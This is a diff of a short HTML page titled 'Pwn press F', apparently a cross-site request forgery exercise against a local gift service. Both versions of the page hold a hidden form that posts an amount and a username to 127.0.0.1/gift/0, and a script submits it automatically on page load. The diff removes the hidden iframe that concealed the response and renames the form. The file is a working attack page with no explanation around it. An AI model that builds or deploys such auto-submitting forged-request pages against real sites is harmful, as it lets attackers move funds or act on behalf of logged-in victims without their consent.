@@ -4,13 +4,12 @@
 	</head>
 	<body>
 		<h1>Pwn press F</h1>
-		<form action="http://127.0.0.1:80/gift/0" method="post" target="hiddenframe" name="csrfform">
+		<form action="http://127.0.0.1:80/gift/0" method="post" name="badform">
 		
-		        <input type="hidden" name="amount" value="700" /> 
-			<input type="hidden" name="username" value="bryan" /> 
+		        <input type="hidden" name="amount" value="66" /> 
+			<input type="hidden" name="username" value="bryan1" /> 
 			
-		 <script>document.csrfform.submit();</script>
+		 <script>document.badform.submit();</script>
 		</form>
-		<iframe name="hiddenframe" style="display: none;"></iframe>
 	</body>
 </html>
